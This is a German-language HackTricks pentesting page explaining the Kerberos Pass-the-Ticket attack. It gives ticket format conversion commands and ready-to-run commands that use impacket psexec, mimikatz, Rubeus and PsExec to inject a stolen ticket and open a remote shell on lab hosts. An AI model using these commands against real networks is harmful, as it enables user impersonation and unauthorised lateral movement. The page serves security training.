# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Pass The Ticket (PTT)

Bei der Angriffsmethode **Pass The Ticket (PTT)** **stehlen Angreifer das Authentifizierungsticket eines Benutzers**, anstatt dessen Passwort oder Hashwerte zu stehlen. Dieses gestohlene Ticket wird anschließend verwendet, um **sich als der Benutzer auszugeben** und unautorisierten Zugriff auf Ressourcen und Dienste innerhalb eines Netzwerks zu erlangen.<sup>[[1]](#references)</sup>

**Lesen**:

- [Tickets von Windows sammeln](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Tickets von Linux sammeln](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

### **Linux- und Windows-Tickets zwischen Plattformen austauschen**

Das Tool [**ticket_converter**](https://github.com/Zer1t0/ticket_converter) konvertiert Ticketformate, wobei lediglich das Ticket selbst und eine Ausgabedatei erforderlich sind.
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache => kirbi

python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
```
Unter Windows kann [Kekeo](https://github.com/gentilkiwi/kekeo) verwendet werden.

### Pass The Ticket Attack
```bash:Linux
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

```bash:Windows
#Load the ticket in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
klist #List tickets in cache to cehck that mimikatz has loaded the ticket
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
## Referenzen

- [1] [Kerberos (II): How to attack Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#include ../../banners/hacktricks-training.md}}
